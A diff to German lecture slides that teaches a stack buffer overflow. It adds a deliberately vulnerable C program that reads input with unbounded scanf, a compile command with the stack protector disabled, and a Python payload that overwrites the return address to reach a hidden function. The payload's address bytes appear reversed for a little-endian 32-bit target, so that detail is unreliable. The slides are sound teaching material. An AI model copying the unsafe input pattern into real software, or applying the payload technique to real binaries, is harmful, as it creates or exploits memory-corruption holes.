@@ -722,7 +722,88 @@
   \includegraphics[scale=0.25]{integer_overflow}
 \end{frame}
 
+\begin{frame}[fragile]{Buffer Overflows -Programm I}
+  \begin{lstlisting}[style=CStyle]
+  void secretFunction()
+  {
+    printf("Congratulations!\n");
+    printf("You have entered in the secret function!\n");
+  }
 
+  void echo()
+  {
+    char buffer[20];
+
+    printf("Enter some text:\n");
+    scanf("%s", buffer);
+    printf("You entered: %s\n", buffer);
+  }
+
+  int main()
+  {
+    echo();
+
+    return 0;
+  }
+  \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Buffer Overflows -Programm II}
+  Compilieren f\"ur 32 bit:
+  \begin{lstlisting}[style=BashStyle]
+  gcc vuln.c -o vuln -fno-stack-protector -m32
+  \end{lstlisting}
+
+  Normale Eingabe:
+  \begin{lstlisting}[style=BashStyle]
+  Enter some text:
+  HackIt!
+  You entered: HackIt!
+  \end{lstlisting}
+
+  \includegraphics[scale=0.5]{stack}
+\end{frame}
+
+\begin{frame}[fragile]{Buffer Overflows -Programm III}
+  Anzeigen des Disassembly:
+  \begin{lstlisting}[style=BashStyle]
+  objdump -d vuln
+  \end{lstlisting}
+  \begin{figure}%
+   \centering
+   {\includegraphics[scale=0.1]{buf_c_1}}%
+   \quad
+   {\includegraphics[scale=0.1]{buf_c_2}}%
+  \end{figure}
+\end{frame}
+
+\begin{frame}[fragile]{Buffer Overflows -Programm IV}
+  \begin{itemize}
+    \item Adresse von \textit{secretFunction} ist \textbf{0000059d}
+    \item 38 in hex oder 56 in dezimal reserviert f\"ur lokale variablen der echo Funktion.
+    \item 28 bytes sind f\"ur Buffer reserviert.
+  \end{itemize}
+
+  \textbf{Payload:}
+  \newline
+  Die ersten 28+4=32 bytes sind zuf\"llige Chars und die n\"achsten 4 bytes die Addresse der \textit{secretFunction}.
+  \begin{lstlisting}[style=BashStyle]
+  python -c 'print "a"*32 + "\x00\x00\x05\x9d"' | ./vuln
+  \end{lstlisting}
+
+  Ausgabe:
+  \begin{lstlisting}[style=BashStyle]
+  Enter some text:
+  You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<rubbish 3 bytes>
+  Congratulations!
+  You have entered in the secret function!
+  Illegal instruction (core dumped)
+  \end{lstlisting}
+\end{frame}
+
+%----------------------------------------------------------------------------------------
+%	Sources
+%----------------------------------------------------------------------------------------
 
 \begin{frame}[fragile]{Quellen}
   \begin{itemize}
